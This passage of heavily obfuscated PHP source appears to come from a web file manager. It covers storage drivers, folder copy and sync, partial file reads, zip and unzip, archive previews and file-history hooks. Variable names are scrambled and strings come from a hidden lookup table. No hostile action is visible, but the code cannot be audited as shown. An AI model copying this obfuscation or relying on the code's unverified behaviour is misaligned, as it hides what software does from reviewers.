$ñŞâùËİ[$à¢šŞù£]) { $¿¼½Œìš = $ñŞâùËİ[$à¢šŞù£]; break; } else { if ($¿¼½Œìš > $ñŞâùËİ[$à¢šŞù£ - 1] && $¿¼½Œìš <= $ñŞâùËİ[$à¢šŞù£]) { $¿¼½Œìš = $ñŞâùËİ[$à¢šŞù£]; break; } else { if ($à¢šŞù£ == count($ñŞâùËİ) - 1 && $¿¼½Œìš > $ñŞâùËİ[$à¢šŞù£]) { $¿¼½Œìš = $ñŞâùËİ[$à¢šŞù£]; break; } } } } $Œ‡çë©ß = self::driverMake($¯ˆüö¿¬); if ($Œ‡çë©ß->isFileOutServer()) { return $Œ‡çë©ß->fileOutImageServer($¯ˆüö¿¬, $¿¼½Œìš); } return $Œ‡çë©ß->fileOutImage($¯ˆüö¿¬, $¿¼½Œìš); } private static function driverIsSame($®úú»ªº, $µêµ…ó˜) { $û£äôŒğ =& $_SERVER[¥ÙÌÜ¾ê]; $†˜î‡¶Ö = $®úú»ªº->getType(); $Ê§¦Éò§ = $µêµ…ó˜->getType(); if ($†˜î‡¶Ö != $Ê§¦Éò§) { return !1; } if ($†˜î‡¶Ö == $û£äôŒğ[751]) { return !0; } if ($†˜î‡¶Ö == $û£äôŒğ[106]) { return !0; } if ($®úú»ªº->pathDriver == $µêµ…ó˜->pathDriver) { return !0; } return !1; } public static function copyUpdate($ıĞ’êòÚ, $‹ğÇÜæ¦) { $ÍÌØ¼â =& $_SERVER[¥ÙÌÜ¾ê]; if (!IO::exist($ıĞ’êòÚ)) { return !1; } if (!IO::exist($‹ğÇÜæ¦)) { IO::mkdir($‹ğÇÜæ¦); } $òÜ¸×ÀŒ = self::_listAll($ıĞ’êòÚ); $Âİˆï© = self::_listAll($‹ğÇÜæ¦); $ù¯Õè± = array(); $ÜÏ¼œ‡ì = array(); foreach ($òÜ¸×ÀŒ as $”Òï¯Á¤ => $ÓúÒ†æ·) { if (isset($Âİˆï©[$”Òï¯Á¤])) { if ($ÓúÒ†æ·[$ÍÌØ¼â[77]] == 1) { continue; } if ($Âİˆï©[$”Òï¯Á¤][$ÍÌØ¼â[78]] == $ÓúÒ†æ·[$ÍÌØ¼â[78]]) { continue; } } if ($ÓúÒ†æ·[$ÍÌØ¼â[77]] == 1) { $ÜÏ¼œ‡ì[] = $‹ğÇÜæ¦ . $ÍÌØ¼â[8] . $”Òï¯Á¤; continue; } $×ª†ÛÆ… = strstr(trim($”Òï¯Á¤, $ÍÌØ¼â[8]), $ÍÌØ¼â[8]) ? get_path_father($”Òï¯Á¤) : $ÍÌØ¼â[33]; $ù¯Õè±[] = array($ÍÌØ¼â[1090] => $ÓúÒ†æ·[$ÍÌØ¼â[76]], $ÍÌØ¼â[1091] => rtrim($‹ğÇÜæ¦, $ÍÌØ¼â[8]) . $ÍÌØ¼â[8] . $×ª†ÛÆ…, $ÍÌØ¼â[1092] => $ÓúÒ†æ·); } $°„ø†ä = array($ÍÌØ¼â[193] => $ù¯Õè±, $ÍÌØ¼â[77] => $ÜÏ¼œ‡ì); Hook::trigger($ÍÌØ¼â[1093], $ıĞ’êòÚ, $‹ğÇÜæ¦, $°„ø†ä); foreach ($ÜÏ¼œ‡ì as $ÓúÒ†æ·) { IO::mkdir($ÓúÒ†æ·); } foreach ($ù¯Õè± as $ÓúÒ†æ·) { IO::copy($ÓúÒ†æ·[$ÍÌØ¼â[1090]], $ÓúÒ†æ·[$ÍÌØ¼â[1091]], REPEAT_REPLACE); } } private static function _listAll($ßŸ³£¼Ê) { $€Îè™•… =& $_SERVER[¥ÙÌÜ¾ê]; $ßŸ³£¼Ê = KodIO::clear($ßŸ³£¼Ê); $ÂÈ•¨–Ó = IO::listAll($ßŸ³£¼Ê); foreach ($ÂÈ•¨–Ó as &$Êš‰ğ¶ô) { $¥±Ñõºš = substr($Êš‰ğ¶ô[$€Îè™•…[76]], strlen($ßŸ³£¼Ê)); $Êš‰ğ¶ô[$€Îè™•…[1094]] = trim($¥±Ñõºš, $€Îè™•…[8]); } unset($Êš‰ğ¶ô); return array_to_keyvalue($ÂÈ•¨–Ó, $€Îè™•…[1094]); } public static function fileSubstr($Ïôêú…œ, $ÍÂ–Š®¨, $•ˆğ¹¨ = false) { $åòÈ¸­¨ =& $_SERVER[¥ÙÌÜ¾ê]; $»ŸÎ“û­ = self::driverMake($Ïôêú…œ); $…ëÈ¶õÉ = $»ŸÎ“û­->size($Ïôêú…œ); $šù²É Ç = $ÍÂ–Š®¨; $½´æ¨ = $•ˆğ¹¨; if ($ÍÂ–Š®¨ < 0) { $ÍÂ–Š®¨ = $…ëÈ¶õÉ + $ÍÂ–Š®¨; } if ($•ˆğ¹¨ === !1) { $•ˆğ¹¨ = $…ëÈ¶õÉ - $ÍÂ–Š®¨; } if ($ÍÂ–Š®¨ + $•ˆğ¹¨ > $…ëÈ¶õÉ) { $•ˆğ¹¨ = $…ëÈ¶õÉ - $ÍÂ–Š®¨; } if (!$…ëÈ¶õÉ && $»ŸÎ“û­->getType() == $åòÈ¸­¨[106] && !$»ŸÎ“û­->exist($Ïôêú…œ)) { throw new Exception($åòÈ¸­¨[1095] . LNG($åòÈ¸­¨[1096]) . $åòÈ¸­¨[963] . get_path_this($Ïôêú…œ) . $åòÈ¸­¨[33]); } if ($•ˆğ¹¨ <= 0) { return $åòÈ¸­¨[33]; } if ($ÍÂ–Š®¨ < 0 || $ÍÂ–Š®¨ >= $…ëÈ¶õÉ || $•ˆğ¹¨ > 1024 * 1024 * 10) { throw new Exception("\146\151\154\x65\122\x65\141\x64\x20\x65\162\162\x6f\x72\41\40\163\x74\x61\x72\x74\75{$ÍÂ–Š®¨}\x3b\154\x65\x6e\x67\164\150\75{$•ˆğ¹¨}\x3b\x20\163\151\x7a\145\75{$…ëÈ¶õÉ}\73"); } $‚ÙšäÖÖ = $»ŸÎ“û­->fileSubstr($Ïôêú…œ, $ÍÂ–Š®¨, $•ˆğ¹¨); if (!$‚ÙšäÖÖ && $•ˆğ¹¨ && isset($GLOBALS[$åòÈ¸­¨[1097]])) { throw new Exception($GLOBALS[$åòÈ¸­¨[1097]][$åòÈ¸­¨[1098]]); } return $‚ÙšäÖÖ; } private static function driverMake(&$÷ĞÅ’ªì) { $°Ñ÷•Ş =& $_SERVER[¥ÙÌÜ¾ê]; $€ÎÜœ¿Û = KodIO::parse($÷ĞÅ’ªì); if (!self::$driverListSystem) { $õÈ‘æ­» = Model($°Ñ÷•Ş[760])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($õÈ‘æ­», $°Ñ÷•Ş[395]); } if ($€ÎÜœ¿Û[$°Ñ÷•Ş[29]] == KodIO::KOD_IO && !self::$driverListSystem[$€ÎÜœ¿Û[$°Ñ÷•Ş[395]]]) { return !1; } $÷ĞÅ’ªì = $€ÎÜœ¿Û[$°Ñ÷•Ş[1099]]; $ÔÕçÂÉÉ = self::driverGet($€ÎÜœ¿Û, $÷ĞÅ’ªì); return $ÔÕçÂÉÉ; } private static function driverGet($èæ¡ıŞ , &$ö€±¬) { $«Æ¹şü =& $_SERVER[¥ÙÌÜ¾ê]; $Üø¥¦ó = $èæ¡ıŞ [$«Æ¹şü[1100]]; $¡íİ¹¢« = $èæ¡ıŞ [$«Æ¹şü[395]]; switch ($èæ¡ıŞ [$«Æ¹şü[29]]) { case KodIO::KOD_IO: $æ¿Ë•§ = self::$driverListSystem[$¡íİ¹¢«]; break; case KodIO::KOD_SOURCE: $ö€±¬ = $¡íİ¹¢« . $ö€±¬; $æ¿Ë•§ = array($«Æ¹şü[1101] => $«Æ¹şü[1102], $«Æ¹şü[6] => $èæ¡ıŞ ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¸ÓºÙŠë = $GLOBALS[$«Æ¹şü[1103]]; self::$driverListUser = array_to_keyvalue($¸ÓºÙŠë, $«Æ¹şü[395]); } $æ¿Ë•§ = self::$driverListUser[$¡íİ¹¢«]; break; case KodIO::KOD_SHARE_LINK: $æ¿Ë•§ = array($«Æ¹şü[1101] => $«Æ¹şü[1104], $«Æ¹şü[6] => $èæ¡ıŞ ); $ÓåöŸ‡Å = Action($«Æ¹şü[1105])->sharePathInfo($èæ¡ıŞ [$«Æ¹şü[76]]); $ö€±¬ = $ÓåöŸ‡Å[$«Æ¹şü[397]]; if (!$ÓåöŸ‡Å[$«Æ¹şü[397]]) { $¶õ˜Û¦× = Model($«Æ¹şü[589])->getInfo($ÓåöŸ‡Å[$«Æ¹şü[482]]); $ö€±¬ = KodIO::clear($¶õ˜Û¦×[$«Æ¹şü[1106]] . $èæ¡ıŞ [$«Æ¹şü[1099]]); $èæ¡ıŞ [$«Æ¹şü[480]] = $¶õ˜Û¦×; $èæ¡ıŞ [$«Æ¹şü[1083]] = $ö€±¬; $æ¿Ë•§ = array($«Æ¹şü[1101] => $«Æ¹şü[1107], $«Æ¹şü[6] => $èæ¡ıŞ ); } break; case KodIO::KOD_SHARE_ITEM: $æ¿Ë•§ = array($«Æ¹şü[1101] => $«Æ¹şü[1108], $«Æ¹şü[6] => $èæ¡ıŞ ); $¶õ˜Û¦× = Model($«Æ¹şü[589])->getInfo($èæ¡ıŞ [$«Æ¹şü[395]]); if ($¶õ˜Û¦×[$«Æ¹şü[397]] == $«Æ¹şü[191]) { $ö€±¬ = KodIO::clear($¶õ˜Û¦×[$«Æ¹şü[1106]] . $èæ¡ıŞ [$«Æ¹şü[1099]]); $èæ¡ıŞ [$«Æ¹şü[480]] = $¶õ˜Û¦×; $èæ¡ıŞ [$«Æ¹şü[1083]] = $ö€±¬; $æ¿Ë•§ = array($«Æ¹şü[1101] => $«Æ¹şü[1109], $«Æ¹şü[6] => $èæ¡ıŞ ); } else { if (!$ö€±¬) { $ö€±¬ = $¶õ˜Û¦×[$«Æ¹şü[397]]; } } break; default: $ö€±¬ = $èæ¡ıŞ [$«Æ¹şü[76]]; $æ¿Ë•§ = array($«Æ¹şü[1101] => $«Æ¹şü[1110]); break; } $€œªÒ“ = $èæ¡ıŞ [$«Æ¹şü[76]]; if (!isset(self::$driverCache[$€œªÒ“])) { $ç¼Š¨³ì = strtolower($æ¿Ë•§[$«Æ¹şü[94]]); $÷éµ€ñ = $GLOBALS[$«Æ¹şü[6]][$«Æ¹şü[88]][$«Æ¹şü[826]]; $ñ„‹ï”§ = $«Æ¹şü[72] . (isset($÷éµ€ñ[$ç¼Š¨³ì]) ? $÷éµ€ñ[$ç¼Š¨³ì] : ucfirst($ç¼Š¨³ì)); if (!class_exists($ñ„‹ï”§)) { show_json("{$ñ„‹ï”§}\x20\156\x6f\164\x20\x65\x78\x69\163\x74\x73\x21", !1); } $ğ©ÍˆÔ = isset($æ¿Ë•§[$«Æ¹şü[6]]) ? $æ¿Ë•§[$«Æ¹şü[6]] : !1; self::$driverCache[$€œªÒ“] = new $ñ„‹ï”§($ğ©ÍˆÔ); } $”ùš‚¨ = self::$driverCache[$€œªÒ“]; $”ùš‚¨->pathDriver = $Üø¥¦ó; $”ùš‚¨->pathBase = $«Æ¹şü[33]; if (isset($æ¿Ë•§[$«Æ¹şü[6]][$«Æ¹şü[1111]])) { $”ùš‚¨->pathBase = rtrim($æ¿Ë•§[$«Æ¹şü[6]][$«Æ¹şü[1111]], $«Æ¹şü[8]) . $«Æ¹şü[8]; $ö€±¬ = $”ùš‚¨->pathBase . ltrim($ö€±¬, $«Æ¹şü[8]); } $ö€±¬ = $”ùš‚¨->getPath($ö€±¬); if (isset($èæ¡ıŞ [$«Æ¹şü[1083]])) { $ö€±¬ = $èæ¡ıŞ [$«Æ¹şü[1083]]; } $”ùš‚¨->path = $ö€±¬; return $”ùš‚¨; } public static function errorTips($Ö½‘¬Ø = false) { $Ï‚ú¯ßà =& $_SERVER[¥ÙÌÜ¾ê]; static $±³ÇßÒ = array(); $Ê¯¼ç…á = 1000; if ($Ö½‘¬Ø === -1) { return $±³ÇßÒ ? $±³ÇßÒ[count($±³ÇßÒ) - 1] : $Ï‚ú¯ßà[33]; } if ($Ö½‘¬Ø === !1) { return implode($Ï‚ú¯ßà[229], $±³ÇßÒ); } if (count($±³ÇßÒ) >= $Ê¯¼ç…á) { $±³ÇßÒ = array_slice($±³ÇßÒ, $Ê¯¼ç…á * 0.5, $Ê¯¼ç…á); } $±³ÇßÒ[] = $Ö½‘¬Ø; write_log($Ï‚ú¯ßà[160] . ACTION . $Ï‚ú¯ßà[1112] . $Ö½‘¬Ø, $Ï‚ú¯ßà[1113]); } public static function getLastError($²ÂÆ„© = '') { $ıåÑ¶¾à = self::errorTips(-1); return $ıåÑ¶¾à ? $ıåÑ¶¾à : $²ÂÆ„©; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ÿ™šÒ„©; if (!$Ÿ™šÒ„©) { $ú‹ÉÃ¯ğ = IO::init($_SERVER[¥ÙÌÜ¾ê][8]); } return $ú‹ÉÃ¯ğ; } private static function iconvSystem($ØĞáİÎ) { return self::local()->iconvSystem($ØĞáİÎ); } private static function iconvApp($à‡ƒ©Æ) { return self::local()->iconvApp($à‡ƒ©Æ); } public static function zip($Ü”¿êÔ¾, $õŒÙÕ˜ú = "\x7a\151\160", $»ÃÛü²» = '', $šéÁ˜²Ò = REPEAT_RENAME) { $‘Óà§Ç =& $_SERVER[¥ÙÌÜ¾ê]; $Ã·…ô‘ = self::init($Ü”¿êÔ¾[0][$‘Óà§Ç[76]]); $Éöú†İ… = self::info($Ü”¿êÔ¾[0][$‘Óà§Ç[76]]); $¸ª½‚ãæ = !1; if (!$»ÃÛü²» && $Ã·…ô‘->getType() == $‘Óà§Ç[106]) { $Á˜¥“‹Ã = self::zipFileList($Ü”¿êÔ¾); } else { $¸ª½‚ãæ = $»ÃÛü²» ? $»ÃÛü²» : TEMP_FILES . $‘Óà§Ç[1114] . time() . rand_string(8) . $‘Óà§Ç[8]; mk_dir($¸ª½‚ãæ); $Á˜¥“‹Ã = self::zipFileList($Ü”¿êÔ¾, $¸ª½‚ãæ); } $Š•—‚÷İ = $Éöú†İ…[$‘Óà§Ç[28]]; if (count($Á˜¥“‹Ã) > 1) { $³Ù÷ç³· = IO::info(IO::pathFather($Éöú†İ…[$‘Óà§Ç[76]])); $Š•—‚÷İ = $³Ù÷ç³·[$‘Óà§Ç[28]]; } $ÀÕ’ÑÔÌ = $¸ª½‚ãæ; if (!$ÀÕ’ÑÔÌ) { $ÀÕ’ÑÔÌ = get_path_father($Éöú†İ…[$‘Óà§Ç[76]]); if (!$»ÃÛü²» && $Ã·…ô‘->getType() == $‘Óà§Ç[106]) { $ÀÕ’ÑÔÌ = get_path_father($Ã·…ô‘->path); } $‘ºñŒ²à = IO::info($ÀÕ’ÑÔÌ); if (!$‘ºñŒ²à[$‘Óà§Ç[196]]) { show_json(LNG($‘Óà§Ç[1115]), !1); } } $æ”‡‰’Ê = $ÀÕ’ÑÔÌ . $Š•—‚÷İ . $‘Óà§Ç[95] . $õŒÙÕ˜ú; $æ”‡‰’Ê = get_filename_auto($æ”‡‰’Ê, $‘Óà§Ç[33], $šéÁ˜²Ò); $Öïçãæ¯ = self::iconvSystem($æ”‡‰’Ê); foreach ($Á˜¥“‹Ã as $š¢èÖ€ => $–¾›¬ä) { $Á˜¥“‹Ã[$š¢èÖ€] = self::iconvSystem($–¾›¬ä); } KodArchive::create($Öïçãæ¯, $Á˜¥“‹Ã); if (!IO::exist($æ”‡‰’Ê)) { if ($¸ª½‚ãæ) { del_dir($¸ª½‚ãæ); } show_json(LNG($‘Óà§Ç[1116]), !1); } if ($»ÃÛü²» || !$¸ª½‚ãæ) { if ($¸ª½‚ãæ && strstr($¸ª½‚ãæ, TEMP_FILES)) { $¬Á—çö› = $Á˜¥“‹Ã = array(); recursion_dir($ÀÕ’ÑÔÌ, $¬Á—çö›, $Á˜¥“‹Ã, 0); foreach ($¬Á—çö› as $©çıâ°) { del_dir($©çıâ°); } foreach ($Á˜¥“‹Ã as $ñó»âÄî) { if ($ñó»âÄî == $Öïçãæ¯) { continue; } del_file($ñó»âÄî); } } return $æ”‡‰’Ê; } $ÔŠúî‹¨ = self::pathFather($Éöú†İ…[$‘Óà§Ç[76]]); $§Ùú‡ı‰ = self::move($æ”‡‰’Ê, $ÔŠúî‹¨, $šéÁ˜²Ò); if (!$§Ùú‡ı‰) { del_dir($¸ª½‚ãæ); show_json(LNG($‘Óà§Ç[1116]), !1); } del_dir($¸ª½‚ãæ); return $§Ùú‡ı‰; } public static function unzip($ğğ³æéº, $’¸‘Øƒ£ = "\x72\x65\160\x6c\141\x63\145") { $•¯Õü¡³ =& $_SERVER[¥ÙÌÜ¾ê]; $ÏÂ×²ñó = $ğğ³æéº[$•¯Õü¡³[76]]; $¢“ä¡¨“ = $ğğ³æéº[$•¯Õü¡³[1117]]; if (!($Ë¡¢›Î = parent::info($ÏÂ×²ñó))) { show_json(LNG($•¯Õü¡³[1118]), !1); } if (!($èîÓ¹ìÀ = parent::infoFull($¢“ä¡¨“))) { $¢“ä¡¨“ = parent::mkdir($¢“ä¡¨“); $èîÓ¹ìÀ = array($•¯Õü¡³[76] => $¢“ä¡¨“); } else { if (isset($èîÓ¹ìÀ[$•¯Õü¡³[397]]) && trim($èîÓ¹ìÀ[$•¯Õü¡³[76]], $•¯Õü¡³[8]) != trim($¢“ä¡¨“, $•¯Õü¡³[8])) { $§õ€É£ó = KodIO::make($èîÓ¹ìÀ[$•¯Õü¡³[492]]); $ºŸªï±Ã = parent::fileNameAuto($§õ€É£ó, $èîÓ¹ìÀ[$•¯Õü¡³[28]], REPEAT_RENAME_FOLDER, !0); $¢“ä¡¨“ = parent::mkdir($§õ€É£ó . $ºŸªï±Ã); $èîÓ¹ìÀ = array($•¯Õü¡³[76] => $¢“ä¡¨“); } } $¢“ä¡¨“ = $èîÓ¹ìÀ[$•¯Õü¡³[76]]; $ƒıíŒÌÇ = self::tmpFileName($Ë¡¢›Î); $È»ù”øÇ = TEMP_FILES . $ƒıíŒÌÇ; del_dir($È»ù”øÇ); mk_dir($È»ù”øÇ); $„À ‚É = self::fileExt($Ë¡¢›Î); $Ÿ¡Ğò = $È»ù”øÇ . $•¯Õü¡³[95] . $„À ‚É; if (!@file_exists(self::iconvSystem($Ÿ¡Ğò))) { $ëÖ¢âÏˆ = self::localFilePath($ÏÂ×²ñó, $„À ‚É); $Ÿ¡Ğò = $ëÖ¢âÏˆ ? $ëÖ¢âÏˆ : parent::download($ÏÂ×²ñó, $Ÿ¡Ğò); } $Ÿ¡Ğò = self::iconvSystem($Ÿ¡Ğò); $¦‰‚Ÿ‹Ù = isset($ğğ³æéº[$•¯Õü¡³[1119]]) ? $ğğ³æéº[$•¯Õü¡³[1119]] : $•¯Õü¡³[1120]; $²­ˆ€ï = KodArchive::extract($Ÿ¡Ğò, $È»ù”øÇ . $•¯Õü¡³[8], $¦‰‚Ÿ‹Ù); self::archiveExt(); if (!$²­ˆ€ï[$•¯Õü¡³[1121]]) { show_json($•¯Õü¡³[1122] . $²­ˆ€ï[$•¯Õü¡³[1123]], !1); } Hook::trigger($•¯Õü¡³[1124], $È»ù”øÇ); recursion_dir($È»ù”øÇ, $ÕÃ“§Ô¿, $¾®”ÅîÉ, 0); $âëˆ“˜à = array_merge($ÕÃ“§Ô¿, $¾®”ÅîÉ); foreach ($âëˆ“˜à as $£Òœ¯ÀÛ) { $£Òœ¯ÀÛ = self::iconvApp($£Òœ¯ÀÛ); self::move($£Òœ¯ÀÛ, $¢“ä¡¨“, $’¸‘Øƒ£); } del_dir($È»ù”øÇ); if (!$ëÖ¢âÏˆ) { del_file($Ÿ¡Ğò); } return !0; } public static function unzipList($˜ö¯¦Ä÷) { $Ë«°ñ =& $_SERVER[¥ÙÌÜ¾ê]; $ÍéÌ¿¨¢ = $˜ö¯¦Ä÷[$Ë«°ñ[76]]; $ ÀÎŒÇË = isset($˜ö¯¦Ä÷[$Ë«°ñ[1125]]) ? $˜ö¯¦Ä÷[$Ë«°ñ[1125]] : -1; $ÒĞ×ñÅ­ = 50000; if (request_url_safe($ÍéÌ¿¨¢)) { $ë¾Ìñ = parse_url_query($ÍéÌ¿¨¢); if (!isset($ë¾Ìñ[$Ë«°ñ[76]])) { show_json($Ë«°ñ[1126], !1); } } $ĞšîĞ­á = isset($ë¾Ìñ) ? $ë¾Ìñ[$Ë«°ñ[76]] : $ÍéÌ¿¨¢; $ÆÒÙ’€‰ = self::info($ĞšîĞ­á); $¿íÚûÕ¹ = self::fileExt($ÆÒÙ’€‰); $êØµ„îÜ = self::tmpFileName($ÆÒÙ’€‰); if (isset($ë¾Ìñ)) { $“•›¼¸Ğ = array($ë¾Ìñ[$Ë«°ñ[76]], $ë¾Ìñ[$Ë«°ñ[1125]], $ë¾Ìñ[$Ë«°ñ[28]]); $¯şüÓÙ = md5(implode($Ë«°ñ[71], $“•›¼¸Ğ)) . $Ë«°ñ[95] . get_path_ext($ë¾Ìñ[$Ë«°ñ[28]]); } else { $“•›¼¸Ğ = array($ÆÒÙ’€‰[$Ë«°ñ[28]], $ÆÒÙ’€‰[$Ë«°ñ[76]], $ÆÒÙ’€‰[$Ë«°ñ[78]]); $¯şüÓÙ = md5(implode($Ë«°ñ[71], $“•›¼¸Ğ)) . $Ë«°ñ[95] . $¿íÚûÕ¹; } if ($ ÀÎŒÇË == -1) { $€‡ûƒ¸‡ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\151\x65\167\57{$êØµ„îÜ}\x2f{$¯şüÓÙ}\x2e\154\x6f\147"; $à©ı¾Ü› = self::infoFull($€‡ûƒ¸‡); if ($à©ı¾Ü›) { $€‡ûƒ¸‡ = $à©ı¾Ü›[$Ë«°ñ[76]]; $ñĞõ¦ë = self::getContent($€‡ûƒ¸‡); if ($ñĞõ¦ë) { $¯åÎÓ¼Œ = json_decode($ñĞõ¦ë, !0); $¯åÎÓ¼Œ = is_array($¯åÎÓ¼Œ) ? $¯åÎÓ¼Œ : array(); if (count($¯åÎÓ¼Œ) >= $ÒĞ×ñÅ­) { show_json(sprintf(LNG($Ë«°ñ[1127]), count($¯åÎÓ¼Œ)), !1); } return $¯åÎÓ¼Œ; } } else { $€‡ûƒ¸‡ = self::mkfile($€‡ûƒ¸‡); } } $òÆÒàŸ = TEMP_FILES . $êØµ„îÜ; if (!is_dir($òÆÒàŸ)) { mk_dir($òÆÒàŸ); } $ßé££á› = $òÆÒàŸ . $Ë«°ñ[8] . $¯şüÓÙ; if (!@file_exists(self::iconvSystem($ßé££á›))) { if (isset($ë¾Ìñ)) { url_request($ÍéÌ¿¨¢, $Ë«°ñ[1128], $ßé££á›); } else { $Áµ“½¢ğ = self::localFilePath($ÍéÌ¿¨¢, $¿íÚûÕ¹); $ßé££á› = $Áµ“½¢ğ ? $Áµ“½¢ğ : self::download($ÍéÌ¿¨¢, $ßé££á›); } } $ßé££á› = self::iconvSystem($ßé££á›); if ($ ÀÎŒÇË >= 0) { $ì™¬Š… = isset($˜ö¯¦Ä÷[$Ë«°ñ[1129]]) ? $˜ö¯¦Ä÷[$Ë«°ñ[1129]] : !1; $¬¤œô‚ê = isset($˜ö¯¦Ä÷[$Ë«°ñ[28]]) ? $˜ö¯¦Ä÷[$Ë«°ñ[28]] : $Ë«°ñ[33]; KodArchive::filePreview($ßé££á›, $ ÀÎŒÇË, $ì™¬Š…, $¬¤œô‚ê); self::archiveExt(); die; } $·—¯Ò®± = KodArchive::listContent($ßé££á›); self::archiveExt(); del_dir($òÆÒàŸ); if (!$·—¯Ò®±[$Ë«°ñ[1121]]) { show_json($·—¯Ò®±[$Ë«°ñ[1123]], !1); } $¯åÎÓ¼Œ = json_encode($·—¯Ò®±[$Ë«°ñ[1123]]); self::setContent($€‡ûƒ¸‡, $¯åÎÓ¼Œ); if (count($·—¯Ò®±[$Ë«°ñ[1123]]) >= $ÒĞ×ñÅ­) { show_json(sprintf(LNG($Ë«°ñ[1127]), count($·—¯Ò®±[$Ë«°ñ[1123]])), !1); } return $·—¯Ò®±[$Ë«°ñ[1123]]; } private static function fileExt($’«Ñş¬Ï) { $”³Á¡± =& $_SERVER[¥ÙÌÜ¾ê]; $˜üÉ±Â = $’«Ñş¬Ï[$”³Á¡±[168]]; if ($˜üÉ±Â == $”³Á¡±[1130]) { $‡Èëæ¤ = $”³Á¡±[1131]; if (substr($’«Ñş¬Ï[$”³Á¡±[28]], -strlen($‡Èëæ¤)) == $‡Èëæ¤) { $˜üÉ±Â = $”³Á¡±[1132]; } } self::archiveExt($˜üÉ±Â); return $˜üÉ±Â; } private static function zipFileList($Å÷ıö³, $Ü¸Ñ—‹Û = false) { $›èÊëšğ =& $_SERVER[¥ÙÌÜ¾ê]; $óêõ“˜Œ = array(); foreach ($Å÷ıö³ as $¶½ûÂòà) { $ìá‰úá = $¶½ûÂòà[$›èÊëšğ[76]]; if ($Ü¸Ñ—‹Û) { $ìá‰úá = self::copy($¶½ûÂòà[$›èÊëšğ[76]], $Ü¸Ñ—‹Û, $›èÊëšğ[818]); } else { $¼ĞÒ¹ƒ = self::init($¶½ûÂòà[$›èÊëšğ[76]]); if ($¼ĞÒ¹ƒ->getType() == $›èÊëšğ[106]) { $ìá‰úá = $¼ĞÒ¹ƒ->path; } } if ($ìá‰úá && self::local()->exist($ìá‰úá)) { $óêõ“˜Œ[$¶½ûÂòà[$›èÊëšğ[76]]] = $ìá‰úá; } } if (!empty($óêõ“˜Œ)) { return array_values($óêõ“˜Œ); } show_json(LNG($›èÊëšğ[1096]), !1); } public static function tmpFileName($˜µ¾èˆ) { $Â‹ää =& $_SERVER[¥ÙÌÜ¾ê]; $À¨©¿üÛ = array($˜µ¾èˆ[$Â‹ää[28]], $˜µ¾èˆ[$Â‹ää[76]], $˜µ¾èˆ[$Â‹ää[78]], $˜µ¾èˆ[$Â‹ää[515]]); return md5(implode($Â‹ää[71], $À¨©¿üÛ)); } private static function localFilePath($ÀÑ²«Ï, $±ÒúòÊ) { $§¹ëÊîÑ =& $_SERVER[¥ÙÌÜ¾ê]; if ($±ÒúòÊ == $§¹ëÊîÑ[1133] && strtoupper(substr(PHP_OS, 0, 3)) == $§¹ëÊîÑ[1134]) { return !1; } $ŒÃùÓ³ö = KodIO::parse($ÀÑ²«Ï); if ($ŒÃùÓ³ö[$§¹ëÊîÑ[29]] == KodIO::KOD_SOURCE) { $ç½õšÃ = Model($§¹ëÊîÑ[825])->fileInfoGet(KodIO::sourceID($ÀÑ²«Ï)); if (!$ç½õšÃ[$§¹ëÊîÑ[76]]) { show_json($§¹ëÊîÑ[1135], !1); } $ÀÑ²«Ï = $ç½õšÃ[$§¹ëÊîÑ[76]]; } $¦—ç¸âš = self::init($ÀÑ²«Ï); if ($¦—ç¸âš->pathParse[$§¹ëÊîÑ[1083]]) { $ÀÑ²«Ï = $¦—ç¸âš->pathParse[$§¹ëÊîÑ[1083]]; $¦—ç¸âš = self::init($ÀÑ²«Ï); } $ÜÍ¯Şé† = $¦—ç¸âš->getType(); if ($ÜÍ¯Şé† == $§¹ëÊîÑ[106] || $ÜÍ¯Şé† == $§¹ëÊîÑ[1136]) { if (!$¦—ç¸âš->exist($¦—ç¸âš->path)) { show_json(LNG($§¹ëÊîÑ[105]), !1); } return $¦—ç¸âš->path; } return !1; } private static function archiveExt($š£¹—Şñ = '') { $GLOBALS[$_SERVER[¥ÙÌÜ¾ê][1137]] = $š£¹—Şñ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ışáùö¹ =& $_SERVER[¥ÙÌÜ¾ê]; $Âº ‘‡ü = $GLOBALS[$ışáùö¹[6]][$ışáùö¹[88]]; if ($Âº ‘‡ü[$ışáùö¹[1138]] != 1) { return; } if ($Âº ‘‡ü[$ışáùö¹[1139]] <= 0) { return; } if (isset($_REQUEST[$ışáùö¹[1140]]) && $_REQUEST[$ışáùö¹[1140]] == $ışáùö¹[87]) { return; } Hook::bind($ışáùö¹[1141], $ışáùö¹[1142]); Hook::bind($ışáùö¹[1143], $ışáùö¹[1144]); Hook::bind($ışáùö¹[1145], $ışáùö¹[1146]); Hook::bind($ışáùö¹[1147], $ışáùö¹[1148]); Hook::bind($ışáùö¹[1149], $ışáùö¹[1150]); Hook::bind($ışáùö¹[1151], $ışáùö¹[1152]); } public static function eventBeforeUpload($ÃøàÈ„º) { if ($ÃøàÈ„º[3] && $ÃøàÈ„º[3] != REPEAT_REPLACE) { return; } $ùçàùä = self::parsePath($ÃøàÈ„º[0]); if (!$ùçàùä) { return; } self::add($ùçàùä); } public static function eventBeforeEdit($İÄÈ§Ñë) { $øõ¯­‘û = self::parsePath($İÄÈ§Ñë[0]); if (!$øõ¯­‘û) { return; } self::add($øõ¯­‘û); } public static function eventBeforeCopyFile($¢ÕÍÀ§, $™ß’ò®˜, $Ä½åš†–, $¹Œ€ìƒÂ, $Üğ‘¤¼, $ûéâ¥ÚÔ) { $ó“ó‰÷Ã = $Ä½åš†–->getPathOuter($¹Œ€ìƒÂ); $ßÓˆ‡ª¨ = self::parsePath($ó“ó‰÷Ã); if (!$ßÓˆ‡ª¨) { return; } self::add($ßÓˆ‡ª¨); } public static function eventBeforeRename($á´İğŸÜ) { $¼¨ô­Ì£ =& $_SERVER[¥ÙÌÜ¾ê]; $’œŸæÉÆ = self::parsePath($á´İğŸÜ[0]); if (!$’œŸæÉÆ) { return; } $×ÌÍã = self::checkInHistory($’œŸæÉÆ); if (!$×ÌÍã) { return; } if ($×ÌÍã[$¼¨ô­Ì£[29]] == $¼¨ô­Ì£[193]) { $èşÕø¥Ô = self::listData($’œŸæÉÆ); if ($èşÕø¥Ô && $èşÕø¥Ô[$¼¨ô­Ì£[367]]) { self::moveHistory($’œŸæÉÆ, $á´İğŸÜ[1]); } } else { 